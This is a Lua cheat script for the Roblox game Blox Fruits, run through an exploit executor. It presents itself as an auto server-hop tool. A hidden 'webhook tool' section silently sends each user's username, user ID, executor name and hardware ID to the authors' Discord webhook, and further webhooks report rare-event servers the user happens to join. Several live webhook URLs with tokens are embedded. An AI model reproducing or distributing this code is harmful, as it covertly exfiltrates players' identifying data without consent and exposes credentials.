--// PHUCMAX & VINH - AUTO HOP SERVER Blox Fruits
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Ch hot ng vi Blox Fruits
if game.PlaceId ~= 7449423635 and game.PlaceId ~= 2753915549 then
    warn(" Không phi Blox Fruits!")
    return
end

-- Danh sách server ã vào
local joinedServers = {}
local PlaceId = game.PlaceId

-- T lu server ã vào
local function addServer(jobId)
    joinedServers[jobId] = true
end
addServer(game.JobId)

-- Hàm ly server mi
local function getNewServer()
    local cursor = ""
    local servers = {}
    local found = false

    while not found do
        local url = "https://games.roblox.com/v1/games/" .. PlaceId .. "/servers/Public?sortOrder=Asc&limit=100" .. (cursor ~= "" and "&cursor=" .. cursor or "")
        local response = game:HttpGet(url)
        local data = HttpService:JSONDecode(response)

        for _, server in ipairs(data.data) do
            if server.playing < server.maxPlayers and not joinedServers[server.id] then
                table.insert(servers, server.id)
                found = true
                break
            end
        end

        if data.nextPageCursor then
            cursor = data.nextPageCursor
        else
            break
        end
    end

    return servers[1]
end

-- Auto hop
local function hop()
    local newServer = getNewServer()
    if newServer then
        print(" Teleporting to new server:", newServer)
        addServer(newServer)
        TeleportService:TeleportToPlaceInstance(PlaceId, newServer, LocalPlayer)
    else
        warn(" Không tìm thy server mi, th li sau...")
    end
end

-- Gi auto hop sau 5 giây
task.wait(0.2)
hop()

--// ROBLOX WEBHOOK TOOL BY PHUCMAX & VINH \\--

-- [] Service Setup
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")
local player = Players.LocalPlayer
local username = player.Name
local displayName = player.DisplayName
local userId = player.UserId
local executor = identifyexecutor and identifyexecutor() or "Unknown"
local hwid = (gethwid and gethwid()) or (syn and syn.request and "Synapse") or "Unknown"
local jobId = game.JobId
local placeId = game.PlaceId

-- [] Webhook: Account Info
pcall(function()
    local webhookUrl = "https://discord.com/api/webhooks/1380938876096610394/lWZBTIKe8xZOVJ71WZp9ngjHhcNbwE0Avprv6BZgREUpiP9rdzbW-aEaAhMZCMEWnh2a"

    local embed = {
        title = "Thông Tin Tài Khon Roblox",
        color = 0x00FFFF,
        fields = {
            { name = "Tên hin th", value = "`" .. displayName .. "`", inline = false },
            { name = "Tên ngi dùng", value = "`" .. username .. "`", inline = false },
            { name = "User ID", value = "`" .. userId .. "`", inline = false },
            { name = "Executor", value = "`" .. executor .. "`", inline = false },
            { name = "HWID", value = "`" .. hwid .. "`", inline = false },
            { name = "Place ID", value = "`" .. placeId .. "`", inline = false },
            { name = "Job ID", value = "`" .. jobId .. "`", inline = false },
            { name = " Trng thái", value = "**+1 bé dùng script **\n *Cm n Chúng Mày*", inline = false }
        }
    }

    local requestFunc = syn and syn.request or http_request or request or (http and http.request)
    if requestFunc then
        requestFunc({
            Url = webhookUrl,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode({ embeds = { embed } })
        })
    end
end)

-- [] Full Moon Server Notify (ONLY Third Sea)
if placeId == 7449423635 then
    local fullmoonWebhook = "https://discord.com/api/webhooks/1380937704925167666/m6Y9QI4NZ9qbRwukMTyxPEmIa-W10rb9hf7D8MdMl-8vTguL0xbdPf-vGDAmO868GfYd"
    local alreadySent = false

    local function getMoonTimer(phase)
        if phase == 5 then return " **FULL MOON!**"
        elseif phase == 4 then return " **Sp Trng Tròn (~1 phút)**"
        elseif phase == 3 then return " **Còn ~2 phút na**"
        else return " **Còn lâu mi ti trng tròn**" end
    end

    local function sendFullMoon()
        local phase = Lighting:GetAttribute("MoonPhase") or 0
        local msg = {
            username = "PHUCMAX & VINH",
            embeds = {{
                title = " Full Moon Server Found [THIRD SEA]",
                color = 16776960,
                fields = {
                    { name = " Full Moon Status:", value = getMoonTimer(phase), inline = true },
                    { name = " Players:", value = #Players:GetPlayers() .. "/12", inline = true },
                    { name = " Moon Phase:", value = tostring(phase) .. "/5", inline = true },
                    { name = " JobId:", value = "```" .. jobId .. "```", inline = false }
                },
                footer = { text = "PHUCMAX & VINH | " .. os.date("%d/%m/%Y %H:%M:%S") }
            }}
        }
        local req = syn and syn.request or http_request or request or (http and http.request)
        if req then
            req({
                Url = fullmoonWebhook,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = HttpService:JSONEncode(msg)
            })
        end
    end

    task.spawn(function()
        while true do
            local moonPhase = Lighting:GetAttribute("MoonPhase") or 0
            if moonPhase == 5 and not alreadySent then
                sendFullMoon()
                alreadySent = true
            elseif moonPhase ~= 5 then
                alreadySent = false
            end
            task.wait(10)
        end
    end)
end

-- [] Mirage Island Notify
task.spawn(function()
    task.wait(10)
    for _, v in pairs(workspace:GetDescendants()) do
        if (v:IsA("BasePart") or v:IsA("Model")) and v.Name:lower():find("mirage") then
            local mirageWebhook = "https://discord.com/api/webhooks/1380938550962556938/NY9VImFOcUSe8zwMdY68k0YHuwSHGzCrPFpeXlJVUIU_PQw6m4PkyO6VusHjHOoi3JEL"
            local message = {
                username = "PHUCMAX&VINH Mirage Notify",
                embeds = {{
                    title = "**Mirage Island Spawned!**",
                    color = 16753920,
                    fields = {
                        { name = " Spawn:", value = "Mirage Island", inline = true },
                        { name = " Time Of Day:", value = Lighting.ClockTime < 18 and " Ngày" or " Ti", inline = true },
                        { name = " Players:", value = #Players:GetPlayers() .. " players", inline = true },
                        { name = " JobId:", value = "```" .. jobId .. "```", inline = false }
                    },
                    footer = { text = "PHUCMAX & VINH | " .. os.date("Hôm nay lúc %H:%M") }
                }}
            }

            local req = syn and syn.request or http_request or request or (http and http.request)
            if req then
                req({
                    Url = mirageWebhook,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = HttpService:JSONEncode(message)
                })
            end
            break
        end
    end
end)

-- [] Prehistoric Island Notify
task.spawn(function()
    task.wait(10)
    for _, v in pairs(workspace:GetDescendants()) do
        if (v:IsA("BasePart") or v:IsA("Model")) and v.Name:lower():find("prehistoric") then
            local webhookUrl = "https://discord.com/api/webhooks/1380938259282133074/4vz23EwIJzX36MS_I_JyVxaQLhJtgEBJITd83xt2pq41QHrLwFNnhcBLd66lfkmEWsEQ"
            local message = {
                username = "PHUCMAX&VINH Prehistoric Notify",
                embeds = {{
                    title = "**Prehistoric Island Spawned!**",
                    color = 16753920,
                    fields = {
                        { name = " Spawn:", value = "Prehistoric Island", inline = true },
                        { name = " Time Of Day:", value = Lighting.ClockTime < 18 and " Ngày" or " Ti", inline = true },
                        { name = " Players:", value = #Players:GetPlayers() .. " players", inline = true },
                        { name = " JobId:", value = "```" .. jobId .. "```", inline = false }
                    },
                    footer = { text = "PHUCMAX & VINH | " .. os.date("Hôm nay lúc %H:%M") }
                }}
            }

            local req = syn and syn.request or http_request or request or (http and http.request)
            if req then
                req({
                    Url = webhookUrl,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = HttpService:JSONEncode(message)
                })
            end
            break
        end
    end
end)